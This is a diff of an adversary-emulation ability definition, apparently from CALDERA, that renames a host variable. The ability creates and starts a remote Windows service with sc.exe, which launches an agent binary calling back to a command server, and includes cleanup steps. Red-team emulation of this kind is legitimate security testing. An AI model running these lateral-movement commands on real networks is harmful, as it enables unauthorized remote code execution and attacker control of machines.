@@ -10,15 +10,15 @@
       psh:
         timeout: 300
         cleanup: |
-          sc.exe \\#{remote.host.fqdn} stop sandsvc;
-          sc.exe \\#{remote.host.fqdn} delete sandsvc /f;
-          taskkill /s \\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"
+          sc.exe \\#{host.fqdn} stop sandsvc;
+          sc.exe \\#{host.fqdn} delete sandsvc /f;
+          taskkill /s \\#{host.fqdn} /FI "Imagename eq s4ndc4t.exe"
         command: |
-          sc.exe \\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";
-          sc.exe \\#{remote.host.fqdn} start sandsvc;
+          sc.exe \\#{host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";
+          sc.exe \\#{host.fqdn} start sandsvc;
           Start-Sleep -s 15;
-          Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;
+          Get-Process -ComputerName #{host.fqdn} s4ndc4t;
   singleton: True
   requirements:
     - plugins.stockpile.app.requirements.no_backwards_movement:
-        - source: remote.host.fqdn
+        - source: host.fqdn
